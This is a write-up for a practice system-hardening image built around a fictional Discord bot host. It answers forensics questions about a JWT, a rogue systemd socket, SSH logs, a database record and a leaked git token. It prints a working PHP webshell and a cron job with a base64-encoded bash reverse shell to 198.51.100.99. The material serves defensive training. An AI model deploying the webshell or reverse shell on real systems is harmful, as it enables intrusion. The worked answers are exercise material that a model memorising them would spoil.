# BotForge Practice Image - Writeup:
## Scenario:
```
SCENARIO
════════
BotForge is a Discord bot hosting provider serving small communities and
developers. The platform allows customers to deploy and manage custom Discord
bots on shared infrastructure.

Three weeks ago, customer "vex" was terminated after their bots were caught
mass-DMing phishing links to users across multiple Discord servers. The
termination did not go smoothly - vex threatened legal action and made vague
statements about "making BotForge regret this decision."

Since termination, staff have observed:
  - Unusual network activity
  - Unexplained processes running during overnight hours
  - Brief CPU spikes occurring every few hours
  - One customer reported their bot token was "somehow leaked"

Your task is to secure this system and remove any unauthorized access that
may have been established.
```

## Forensics Questions:
### Forensics Question #1:
```
A JWT token was found in the system. What is its expiration date?
Format: YYYY-MM-DD

ANSWER:
```
This Forensics Question is quite difficult if you are not familiar with the concept of a JWT token. In general, they are credentials used for authentication, and are sent through HTTP requests.
* Typically, they are sent in a header such as: `Authorization: Bearer <JWT>`
Using this knowledge, we can recursively grep in certain directories to find the JWT token: `grep -R "Authorization: Bearer"`
```
jlee/.bash_history:curl -s http://localhost/api/users -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJ2ZXgiLCJyb2xlIjoiYWRtaW4iLCJpYXQi
jlee/.bash_history:curl -s http://localhost/api/admin/export -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJ2ZXgiLCJyb2xlIjoiYWRtaW4iLCJpYXQi
```
**Please keep in mind that the JWT token was partially cut, and so you would have to examine jlee's .bash_history for the full JWT.**
Using an LLM such as GPT or Gemini and prompting them to determine the expiration date, we find out that the expiration date is `January 1st, 2030`, or `2030-01-01`
* There are also other tools to decode JWT tokens, and so you do not necessarily need to rely on an LLM.
***
### Forensics Question #2:
```
A suspicious systemd socket is listening on a non-standard port.
What is the name of the service that handles connections to this socket?

ANSWER:
```
To list all sockets, we can run the following command `systemctl list-sockets`, which in turn gives us the following output:
```
LISTEN                         UNIT                            ACTIVATES               
0.0.0.0:22                     ssh.socket                      ssh.service
0.0.0.0:2222                   ssh.socket                      ssh.service
[::]:8443                      nginx-notify.socket             -                       
kobject-uevent 1               systemd-udevd-kernel.socket     systemd-udevd.service
/dev/rfkill                    systemd-rfkill.socket           systemd-rfkill.service
/run/avahi-daemon/socket       avahi-daemon.socket             avahi-daemon.service
/run/cups/cups.sock            cups.socket                     cups.service
/run/dbus/system_bus_socket    dbus.socket                     dbus.service
/run/dmeventd-client           dm-event.socket                 dm-event.service
/run/dmeventd-server           dm-event.socket                 dm-event.service
/run/docker.sock               docker.socket                   docker.service
/run/initctl                   systemd-initctl.socket          systemd-initctl.service
/run/lvm/lvmpolld.socket       lvm2-lvmpolld.socket            lvm2-lvmpolld.service
/run/systemd/coredump          systemd-coredump.socket         -                       
/run/systemd/fsck.progress     systemd-fsckd.socket            systemd-fsckd.service
/run/systemd/io.systemd.sysext systemd-sysext.socket           -                       
/run/systemd/journal/dev-log   systemd-journald-dev-log.socket systemd-journald.service
/run/systemd/journal/socket    systemd-journald.socket         systemd-journald.service
/run/systemd/journal/stdout    systemd-journald.socket         systemd-journald.service
/run/systemd/journal/syslog    syslog.socket                   rsyslog.service
/run/udev/control              systemd-udevd-control.socket    systemd-udevd.service
/run/uuidd/request             uuidd.socket                    uuidd.service
```
Immediately, we are able to see that SSH has two ports (with port 2222 being non-standard), and that `nginx-notify.socket` listens on `127.0.0.1:8443`
* Our answer is `nginx-notify.socket` and not SSH because although SSH is suspicious listening on port 2222, it does not trigger anything suspicious in itself.
* Moreover, `nginx-notify.socket` does not have a clear activation target, therefore it is our answer.
***
### Forensics Question #3:
```
Review the authentication logs. Which IP address has the most failed SSH login attempts?

ANSWER:
```
SSH attempts are commonly logged to `/var/log/auth.log`, and upon quick analysis of the file, the most frequent IP address is `203.0.113.42`
* This is pretty difficult to miss, as if you keep scrolling further down, the attempts of this specific IP address are quite abundant.
***
### Forensics Question #4:
```
The IP address from Forensics Question 3 belongs to a customer.
What is that customer's email address? (Check the database)

ANSWER:
```
After solving the previous Forensics Question, we can utilize SQL instructions to query for the specific customer with the matching IP address.
```sql
SHOW DATABASES;
---------------------+
| Database           |
+--------------------+
| botforge           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
USE botforge;
SHOW TABLES;
+--------------------+
| Tables_in_botforge |
+--------------------+
| bots               |
| customers          |
| usage_logs         |
+--------------------+
SELECT * FROM customers;
+----+-----------+--------------------+------------+---------------+---------------------+------------+
| id | username  | email              | plan       | last_login_ip | created_at          | status     |
+----+-----------+--------------------+------------+---------------+---------------------+------------+
|  1 | spectre   | spectre@email.com  | pro        | 192.168.1.100 | 2025-12-30 00:30:52 | active     |
|  2 | axiom     | axiom@email.com    | basic      | 10.0.0.55     | 2025-12-30 00:30:52 | active     |
|  3 | novalux   | novalux@email.com  | enterprise | 172.16.0.1    | 2025-12-30 00:30:52 | active     |
|  4 | vex       | vex@protonmail.com | pro        | 203.0.113.42  | 2025-12-30 00:30:52 | terminated |
|  5 | ghostuser | ghost@temp.com     | basic      | 198.51.100.7  | 2025-12-30 00:30:52 | suspended  |
+----+-----------+--------------------+------------+---------------+---------------------+------------+
exit
```
After this step, we are able to see that our IP address matches with vex, and their email address is `vex@protonmail.com` 
***
### Forensics Question #5:
```
A PHP webshell was found on this system. What value must the
"auth" parameter contain for the shell to execute commands?

ANSWER:
```
A webshell is a malicious backdoor uploaded to an HTTP server. In our case, we have an HTTP server located at `/var/www/dashboard`
* After investigating the contents of the directory, we see a suspicious file labeled `x.php`
* After viewing the contents of the file, you are able to see the specific auth parameter set:
```php
<?php
// BotForge Admin Tool v1.0
// Quick diagnostic utility

$auth = "vex_a3f8c91b";

if(isset($_GET['c']) && isset($_GET['k']) && $_GET['k'] === $auth) {
    system($_GET['c']);
}

if(isset($_POST['cmd']) && isset($_POST['auth']) && $_POST['auth'] === $auth) {
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}
?>
```
Hence, the answer to this Forensics Question is `vex_a3f8c91b`
***
### Forensics Question #6:
```
An obfuscated cron job contains a base64-encoded reverse shell command.
What IP address does it attempt to connect to?

ANSWER:
```
The Forensics Question reveals to us that the reverse shell is executed by a scheduled cronjob. There are so few locations cronjobs can be located, mainly (excluding the many directories):
* `/var/spool/cron/crontabs/`
* `/etc/crontab/`
Upon investigating `/var/spool/cron/crontabs/vex`, we are able to see that the user has a very suspicious cronjob:
```bash
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin

# Backup task
0 */4 * * * echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjk5LzgwODAgMD4mMQ==" | base64 -d | bash
```
After decoding the base64-encoded string inside the file, we are left with: `bash -i >& /dev/tcp/198.51.100.99/8080 0>&1`
* Therefore, `198.51.100.99` is our wanted IP address.
***
### Forensics Question #7:
```
Sensitive credentials were accidentally committed to a git repository.
What Discord bot token can be found in the git history?

ANSWER:
```
Every repository located on a system will always have a directory called **.git**. Git utilizes this directory to track information such as different branches and the commit history. To find every repository, we can use the **find** command with some specified flags.
```bash
$ sudo find / -type d -name ".git" 2>/dev/null
```
This is the output given after running the command in our terminal:
```
/opt/botforge/dashboard/.git
```
After navigating to the root folder `/opt/botforge/dashboard/`, we can run the following git command to show the tracked commit history.
```bash
$ sudo git log
```
This is the output given after running the command in our terminal:
```
commit 63a029d848c7c7d0f2cd9939974eefd6a4aef3ff (HEAD -> master)
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Add status endpoint

commit 1400086168d1e23e691b268a310a737a24439873
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Remove production secrets, add example config

commit c0dae146f3450bd3aa40ae6c30e3af81bfc62649
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Initial dashboard setup
```
After running the following command involving the commit hash, we are able to see the sensitive credentials committed to the repository:
```bash
$ sudo git show 1400086168d1e23e691b268a310a737a24439873
```
This is the output we receive:
```diff
commit 1400086168d1e23e691b268a310a737a24439873
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Remove production secrets, add example config

diff --git a/config/.env.example b/config/.env.example
new file mode 100644
index 0000000..f761ace
*** /dev/null
+++ b/config/.env.example
@@ -0,0 +1,5 @@
+DB_HOST=
+DB_NAME=
+DB_PASS=
+DISCORD_TOKEN=
+API_SECRET=
diff --git a/config/.env.production b/config/.env.production
deleted file mode 100644
index 3ce4896..0000000
*** a/config/.env.production
+++ /dev/null
@@ -1,5 +0,0 @@
-DB_HOST=localhost
-DB_NAME=botforge
-DB_PASS=BotF0rg3_Pr0d!
-DISCORD_TOKEN=MTk4NzY1NDMyMTAxMjM0NTY3OA.Xk9Lpz.secrettoken123abc
-API_SECRET=prod_api_key_super_secret
```
Hence, we know that the leaked Discord token was: `MTk4NzY1NDMyMTAxMjM0NTY3OA.Xk9Lpz.secrettoken123abc`
## Vulnerabilities: